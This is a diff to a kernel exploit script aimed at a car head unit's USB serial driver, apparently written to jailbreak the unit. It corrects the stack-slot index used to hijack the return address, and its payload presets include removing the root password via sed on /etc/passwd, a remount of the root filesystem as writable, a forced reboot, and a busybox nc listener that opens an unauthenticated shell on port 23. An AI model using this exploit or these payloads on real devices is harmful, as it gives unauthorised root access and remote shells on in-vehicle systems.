@@ -17,6 +17,15 @@ BLOB_LEN   = 252          # must be 4-aligned, <= 0xFC (bLength byte doubles
 EXTRA_OFF  = 32           # offsetof(struct usb_host_endpoint, extra)
 STRIDE     = 44           # sizeof(struct usb_host_endpoint)
 R4_CHUNK   = 17           # bulk_in[17] -> saved r4 (lab AND car, verified)
+# LR_CHUNK = 25, i.e. hijack index = 25 (lab AND car). Both frames push the
+# same 9 registers ({r4-r11,lr}, 36 B) and put bulk_in_endpoint[] exactly 68 B
+# below the saved r4: saved r4 at array_base+68 -> slot 17, saved lr eight
+# registers higher at array_base+100 -> slot 25. Car usbserial.ko:
+# push at 0xd0c, sub sp,#172, store at 0xed4 (`add r9,sp,#168; str r3,[r0,#-64]`
+# = sp+104+4i), epilogue 0x1700. Lab build: sub sp,#196, store = sp+128+4i.
+# An index of 26 would put the crafted descriptor one slot too high: PC would
+# land on a plain 7-byte endpoint chunk and the stray store would corrupt the
+# caller's frame.
 VID, PID   = 0x067b, 0x2303   # PL2303: ftdi_sio dies in port_probe (quirk
                               # deref via serial->private clobbered by
                               # serial->port[15]); pl2303 survives: its
@@ -35,30 +44,30 @@ PRESETS = {
     'lab-execve': (26, 25, 0x800f0ac8, 'echo "===PAYLOAD-RAN===" > /dev/console'),
     # blob self-dump: printk B/sp/argv + slot values, then call UMH, then UDF
     'lab-dump': (26, 25, 0x8042e5f0, 'echo "===PAYLOAD-RAN===" > /dev/console'),
-    'car': (27, 26, 0x8003e7c0,
+    'car': (26, 25, 0x8003e7c0,
             'mount -o remount,rw / ; '
             "sed -i 's|^root:.*|root::0:0:root:/home/root:/bin/sh|' /etc/passwd ; "
             'sync ; reboot -f'),
     # car payload variants: same exploit params, only CMD differs (the lab
     # presets above pin LAB addresses and must never run on the car).
     # sed: passwordless root on the UART console.
-    'car-sed': (27, 26, 0x8003e7c0,
+    'car-sed': (26, 25, 0x8003e7c0,
                 'mount -o remount,rw / ; '
                 "sed -i 's|^root:.*|root::0:0:root:/home/root:/bin/sh|' /etc/passwd ; "
                 'sync ; reboot -f'),
     # cfg: the original goal - AA autoconnect flag (/home/root/cfg), file
     # takes effect on the next device-add, so no reboot; / goes back ro.
-    'car-cfg': (27, 26, 0x8003e7c0,
+    'car-cfg': (26, 25, 0x8003e7c0,
                 'mount -o remount,rw / ; '
                 'echo autoconnect=true > /home/root/cfg ; '
                 'sync ; mount -o remount,ro /'),
     # reboot: chain test with no side effects - pause, then reboot -f.
     # First shot on the real car: proves the whole chain without
     # touching passwd or cfg.
-    'car-reboot': (27, 26, 0x8003e7c0, 'sleep 5 ; reboot -f'),
+    'car-reboot': (26, 25, 0x8003e7c0, 'sleep 5 ; reboot -f'),
     # both: sed + cfg in one shot. Tight fit: ';'-separated without spaces
     # to stay inside the 145-byte CMD budget.
-    'car-both': (27, 26, 0x8003e7c0,
+    'car-both': (26, 25, 0x8003e7c0,
                  'mount -o remount,rw /;'
                  "sed -i 's|^root:.*|root::0:0:root:/home/root:/bin/sh|' /etc/passwd;"
                  'echo autoconnect=true>/home/root/cfg;'
@@ -83,7 +92,7 @@ PRESETS = {
     # inetd-only - "Handle incoming telnet connections via inetd", no
     # -F/-p, it just takes over stdio. nc needs no devpts, no pty.
     # After: connect to the car's wifi hotspot, telnet/nc <unit-ip> 23.
-    'car-telnet': (27, 26, 0x8003e7c0, 'busybox nc -ll -p 23 -e /bin/sh'),
+    'car-telnet': (26, 25, 0x8003e7c0, 'busybox nc -ll -p 23 -e /bin/sh'),
     # splash: paint a picture on the head unit's screen - visible proof
     # the chain ran, no side effects (like reboot, but you can see it).
     # /dev/fb0 IS the screen: the UI compositor draws into it
@@ -95,7 +104,7 @@ PRESETS = {
     # 5/21 Vauxhall, 7 Fiat). Only screen0/1/2/4/5 have _HD variants
     # (1280x768); on an HD panel the 800x480 file lands in the top-left
     # with a wrong stride. 800x480 panels (SD) get it right.
-    'car-splash': (27, 26, 0x8003e7c0,
+    'car-splash': (26, 25, 0x8003e7c0,
                    'lzop -dc /usr/share/screens/screen3.fb.lzo>/dev/fb0'),
     # lab twin of car-telnet under QEMU user networking (10.0.2.15):
     # bring eth0 up first, then the same listener. Validated end-to-end
